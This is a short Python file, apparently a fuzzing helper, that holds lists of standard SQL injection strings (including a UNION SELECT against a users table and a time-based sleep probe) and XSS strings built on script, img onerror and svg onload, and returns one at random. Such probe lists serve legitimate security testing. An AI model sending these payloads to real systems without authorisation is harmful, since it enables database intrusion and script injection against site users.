import random

SQLI = [
    "' OR 1=1 --",
    "UNION SELECT * FROM users",
    "' OR sleep(5) --"
]

XSS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>"
]


def generate():
    return random.choice(SQLI + XSS)
